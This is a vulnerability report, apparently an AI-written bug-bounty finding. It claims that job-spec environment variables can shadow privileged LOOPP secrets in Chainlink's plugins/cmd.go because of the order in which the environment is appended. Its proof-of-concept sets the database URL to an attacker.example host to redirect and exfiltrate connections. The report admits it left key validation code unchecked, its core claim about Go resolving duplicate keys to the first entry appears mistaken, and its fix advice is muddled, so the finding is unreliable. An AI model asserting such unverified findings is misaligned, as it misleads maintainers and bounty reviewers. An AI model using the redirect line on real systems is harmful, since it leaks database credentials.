### Title
Attacker-Controlled Job-Spec `EnvVars` Can Shadow Privileged LOOPP Secrets Due To Environment Append Order - ([File: plugins/cmd.go])

### Summary
In `plugins.NewCmdFactory`, the exec'd LOOPP subprocess environment is built by appending the caller-supplied `CmdConfig.Env` (which for generic OCR2 plugins is populated from the job spec's `EnvVars`) *before* appending `registeredLoop.EnvCfg.AsCmdEnv()`, which contains privileged runtime secrets (`DatabaseURL`, `TelemetryAuthPubKeyHex`, `PyroscopeAuthToken`, etc.). Because Go's environment-lookup semantics (`syscall.Getenv`/`os.Getenv`) resolve duplicate keys by returning the **first** matching entry in the environ slice, and the attacker-controlled entries are placed first, an attacker who can define a job spec with a `pluginConfig.EnvVars` key colliding with one of these reserved names can make the child LOOPP process observe the attacker's value instead of the operator secret.

### Finding Description
The relevant code is: [1](#0-0) 

```go
return func() *exec.Cmd {
    cmd := exec.Command(lcfg.Cmd)
    cmd.Env = append(cmd.Env, lcfg.Env...)
    cmd.Env = append(cmd.Env, registeredLoop.EnvCfg.AsCmdEnv()...)
    return cmd
}, nil
```

`lcfg.Env` originates from `CmdConfig.Env`, which is populated for generic OCR2 plugins by merging `plugins.ParseEnvFile` output with the job spec's `OCR2GenericPluginConfig.EnvVars` map (confirmed via `EnvVars` references in `core/services/ocr2/delegate.go` and `core/services/ocr2/validate/validate.go`). This is attacker-influenced input reachable through ordinary job/spec proposal flows for OCR2 generic plugin jobs. `registeredLoop.EnvCfg` is produced by `LoopRegistry.Register` and carries operator secrets such as `DatabaseURL`, `TelemetryAuthPubKeyHex`, and `PyroscopeAuthToken`: [2](#0-1) [3](#0-2) 

Since `cmd.Env = append(cmd.Env, lcfg.Env...)` runs first, any attacker-defined `KEY=value` pair is placed earlier in the `exec.Cmd.Env` slice than the corresponding secret set by `AsCmdEnv()`. Go's own environment resolution (`syscall.Getenv`, used internally by `os.Getenv` in any Go-based LOOPP child process) iterates the environ slice from the start and returns on the first key match — meaning duplicate keys resolve to the *first* occurrence, not the last. This means an attacker-controlled duplicate key placed before the real secret will be the one observed by the LOOPP subprocess via `os.Getenv`, not the operator's privileged value.

No deduplication, key-reservation, or blocklist mechanism was found in `plugins/cmd.go`, `plugins/env.go`, or `plugins/registrar.go` that would prevent a job-spec-supplied key from colliding with a reserved env var name emitted by `loop.EnvConfig.AsCmdEnv()`. I was not able to fully inspect `core/services/ocr2/delegate.go` and `core/services/ocr2/validate/validate.go` in this session to confirm whether upstream validation filters/blocks EnvVars keys that collide with reserved `CL_`-prefixed names before constructing `CmdConfig.Env`; this remains an open verification point, but no such filtering was found in the `plugins` package itself, which is the last line of defense before subprocess spawn.

### Impact Explanation
If unfiltered, this allows an unprivileged job-spec author to shadow the true `DatabaseURL` seen by the LOOPP subprocess — enabling SSRF/data-exfiltration by pointing the plugin at an attacker-controlled Postgres-compatible endpoint — or to shadow `TelemetryAuthPubKeyHex`/`PyroscopeAuthToken`, undermining the authenticity/observability guarantees of those subsystems. This matches the bounty category of secret disclosure / SSRF via privileged runtime configuration override reaching a spawned trusted subprocess.

### Likelihood Explanation
Exploitability depends entirely on whether the exact reserved environment variable name (e.g., the literal key name used by `loop.EnvConfig.AsCmdEnv()`, likely a `CL_`-prefixed constant defined in the `chainlink-common` `loop` package) is guessable/known by an attacker — since these are open-source constants, this is straightforward. The only remaining gate is whether `core/services/ocr2/delegate.go`/`validate.go` sanitizes `EnvVars` keys before constructing `CmdConfig`, which I could not fully confirm from the available index; a background agent with full repo access should verify this before treating the finding as fully exploitable end-to-end.

### Recommendation
In `plugins.NewCmdFactory` (plugins/cmd.go), reverse the append order so operator-controlled secrets are appended last is insufficient by itself given first-match `Getenv` semantics — instead, explicitly deduplicate `cmd.Env` before setting it, or filter `lcfg.Env` to strip/reject any key that collides with a name reserved by `loop.EnvConfig`'s `AsCmdEnv()`, prior to spawning the process. The safest fix is to build the merged environment via a map keyed by variable name, letting the registry-supplied (privileged) values always win over the job-spec-supplied ones, then convert back to a `KEY=VALUE` slice.

### Proof of Concept
Add a unit test in `plugins/cmd_test.go`:
1. Mock `register` to return a `RegisteredLoop{EnvCfg: loop.EnvConfig{DatabaseURL: <secret-url>}}`.
2. Construct `CmdConfig{Env: []string{"CL_DATABASE_URL=http://attacker.example/evil"}}` (using the actual reserved key name from `loop.EnvConfig.AsCmdEnv()`).
3. Call `NewCmdFactory` and inspect the resulting `cmd.Env` slice; assert that `CL_DATABASE_URL` appears twice, with the attacker's value first.
4. Optionally, use a `TestMain`-based helper subprocess (`go test` helper binary pattern) that calls `os.Getenv("CL_DATABASE_URL")` and prints the result; assert the parent test observes the attacker's URL instead of the secret, demonstrating the shadowing behavior end-to-end.

### Citations

**File:** plugins/cmd.go (L21-26)
```go
	return func() *exec.Cmd {
		cmd := exec.Command(lcfg.Cmd) //#nosec G204 -- we control the value of the cmd so the lint/sec error is a false positive
		cmd.Env = append(cmd.Env, lcfg.Env...)
		cmd.Env = append(cmd.Env, registeredLoop.EnvCfg.AsCmdEnv()...)
		return cmd
	}, nil
```

**File:** plugins/loop_registry.go (L100-110)
```go
	if m.cfgDatabase != nil {
		dbURL := m.cfgDatabase.URL()
		envCfg.DatabaseURL = (*commonconfig.SecretURL)(&dbURL)
		envCfg.DatabaseIdleInTxSessionTimeout = m.cfgDatabase.DefaultIdleInTxSessionTimeout()
		envCfg.DatabaseLockTimeout = m.cfgDatabase.DefaultLockTimeout()
		envCfg.DatabaseQueryTimeout = m.cfgDatabase.DefaultQueryTimeout()
		envCfg.DatabaseListenerFallbackPollInterval = m.cfgDatabase.Listener().FallbackPollInterval()
		envCfg.DatabaseLogSQL = m.cfgDatabase.LogSQL()
		envCfg.DatabaseMaxOpenConns = m.cfgDatabase.MaxOpenConns()
		envCfg.DatabaseMaxIdleConns = m.cfgDatabase.MaxIdleConns()
	}
```

**File:** plugins/loop_registry.go (L125-134)
```go
	if m.cfgPyroscope != nil {
		envCfg.PyroscopeAuthToken = m.cfgPyroscope.AuthToken()
		envCfg.PyroscopeServerAddress = m.cfgPyroscope.ServerAddress()
		envCfg.PyroscopeEnvironment = m.cfgPyroscope.Environment()
		envCfg.PyroscopeLinkTracesToProfiles = m.cfgPyroscope.LinkTracesToProfiles()
		if m.autoPPROF != nil {
			envCfg.PyroscopePPROFBlockProfileRate = m.autoPPROF.BlockProfileRate()
			envCfg.PyroscopePPROFMutexProfileFraction = m.autoPPROF.MutexProfileFraction()
		}
	}
```
